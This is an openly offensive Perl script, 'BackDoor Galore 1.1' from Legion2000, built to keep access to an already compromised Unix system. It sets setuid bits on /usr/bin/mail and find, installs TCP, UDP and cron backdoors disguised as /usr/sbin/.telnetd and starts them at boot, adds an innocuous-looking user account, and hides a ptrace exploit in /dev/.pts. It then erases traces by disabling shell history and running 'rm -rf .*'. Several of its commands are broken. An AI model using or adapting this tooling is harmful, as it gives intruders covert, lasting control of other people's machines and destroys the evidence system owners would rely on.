#!/usr/bin/perl
# BackDoor Galore 1.1 (fixed!)
# Author: NTFX <ntfx@legion2000.tk>
# Legion2000 Security Research 1995 -
# This is a simple perl script which backdoors a system for you.
# Updated, set wrong rc.local patch and didnt execute them, blah!
# thats what happens when you code at 4am.
###################################
&option(); 
sub option() {
	system("clear");
print "##################################\n";
print "#Backdoor Galore By NTFX         #\n";
print "#Contact: <ntfx\@legion2000.tk>   #\n";
print "#Legion2000 Security Research (c)#\n";
print "##################################\n";
print "#[ 1] Do this first of all.      #\n"; # must do this cause im lazy.
print "#[ 2] Create setuid binary's.    #\n"; # /usr/bin/mail & /usr/bin/find.
print "#[ 3] Open up TCP backdoor.      #\n"; # 12350 # hid /usr/sbin/.telnetd.
print "#[ 4] Open up UDP backdoor.      #\n"; # 65535 # hid /usr/sbin/.telnetd.
print "#[ 5] Add Cron Sched'd backdoor. #\n"; # 10001 # only open 3 hours a day.
print "#[ 6] Add unsuspicious user.     #\n"; # gpm or news prob best.
print "#[ 7] Hide ptrace Exploit.       #\n"; # /dev/.pts.
print "#[ 8] Removes Traces             #\n";
print "#[ 9] Social Calls.              #\n"; # Sociable Greetings.
print "#[10] Exit the backdoor Script.  #\n"; # quit the backdoor.
print "##################################\n";
print "#Enter Option:";
chomp($number=<STDIN>);
	if($number == "1") { &di() }
	if($number == "2") { &uid() } 
	if($number == "3") { &tcp() } 
	if($number == "4") { &udp() }
	if($number == "5") { &cro() }
	if($number == "6") { &usr() }
	if($number == "7") { &ptr() }
	if($number == "8") { &rem() }
	if($number == "9") { &soc() }
	if($number == "10") { &ex() }
	else { &option() } }
##################
sub di() {
	system ("clear");
	system ("cd $HOME; mkdir ntfx script; mv *.c $HOME/ntfx; mv *pl $HOME/script");
sleep 2;  }
##################
sub uid()  {
	system ("clear");
print "we will now make a setuid file in /usr/bin";
	system ("cd /usr/bin; chmod +s mail; cd $HOME");
print "mail is now +s\n"; #edit as you wish.
	system ("cd /usr/bin; chmod +s find; cd $HOME");
print "find is now +s\n"; #edit as you wish.
sleep 1;  }
##################
sub tcp() {
	system ("clear");
print "We are now going to create a basic tcp backdoor\n";
	system ("cd ../ntfx; gcc tcp.c -o tcp; mv /usr/sbin/.telnetd; echo 
                /usr/sbin/.telnetd >> /etc/rc.d/rc.local; /usr/sbin/.telnetd &"); # starts on boot.
print "tcp backdoor is now running on specified port and enabled at boot\n";
sleep 1;  }
###################
sub udp() {
	system ("clear");
print "We are now going to install a basic udp backdoor\n";
	system ("cd ../ntfx; gcc udp.c -o udp; mv /usr/sbin/.telnetd.; echo
		/usr/sbin/.telnetd. >> /etc/rc.d/rc.local; /usr/sbin/.telnetd. &");
print "udp backdoor now running on specified port and enabled at boot\n";
sleep 1;  }
###################
sub cro() {
	system ("clear");
print "We are now going to install a backdoor into the crond\n";
	system ("bash crond.sh");
print "The cron backdoor is now installed, and running on the specified port\n";
sleep 1; }
###################
sub usr() {
	system ("clear");
print "we will now add a unsuspicious user to the system\n";
print "username: ";
chomp($user=<STDIN>); # be sensible, an acc called "hax0r" will be noticed.
print "UID: ";
chomp($uid=<STDIN>);
print "GID: ";
chomp($gid=<STDIN>);
print "home dir: ";
chomp($home=<STDIN>); #/home/httpd maybe?
print "type of shell: ";
chomp($sh=<STDIN>);
print "comments: "; # preferably leave blank
chomp($cm=<STDIN>);
	system("/usr/sbin/useradd $user -u $uid -g $gid -d $home -s $sh -c $cm");
	system("passwd $user");
sleep 1;  }
##################
sub ptr() {
	system ("clear");
print "we are now going to compile and hide the ptrace exploit\n";
print "name the user you previously entered";
chomp ($usr=<STDIN>);
	system ("cd ../ntfx; gcc ptrace.c -o pts; chown $usr pts; mv pts /dev/.pts");
print "ptrace is now stored in /dev/.pts";
sleep 1;  }
##################
sub soc()  {
	system ("clear");
print "Greetings:\n";
sleep 1;
print "opt1k, SpyModem, eckis, EazyMoney, Phantasm, Epheo, I-L, wired-\n";
sleep 1;
print "BlackSun Research, Legion2000 Crew, efnet #feed-the-goats\n";
$sex;
print "press any key to continue....";
chomp($sex=<STDIN>); }
##################
sub rem() {
	system ("clear");
print "we are now going to remove files we have used.\n";
	system ("rm -rf $HOME/scripts; rm -rf $HOME/ntfx");
print "now removing history files.\n";
	system ("HISTFILE=/dev/null; HISTFILESIZE=0; rm -rf .*"); }
# had to redo due to paul holden selecting remove traces on the original source.
#############
sub ex() {
	system("clear");
print"    #                                      #####    ###     ###     ###\n";
print"    #       ######  ####  #  ####  #    # #     #  #   #   #   #   #   #\n";
print"    #       #      #    # # #    # ##   #       # #     # #     # #     #\n";
print"    #       #####  #      # #    # # #  #  #####  #     # #     # #     #\n";
print"    #       #      #  ### # #    # #  # # #       #     # #     # #     #\n";
print"    #       #      #    # # #    # #   ## #        #   #   #   #   #   #\n";
print"    ####### ######  ####  #  ####  #    # #######   ###     ###     ###\n";
print"			      www.legion2000.tk\n";
print"			    efnet #feed-the-goats\n";
print"\n\n";
print"Press Any Key To Exit\n";
$sex;
chomp($sex=<STDIN>);
exit 1;}
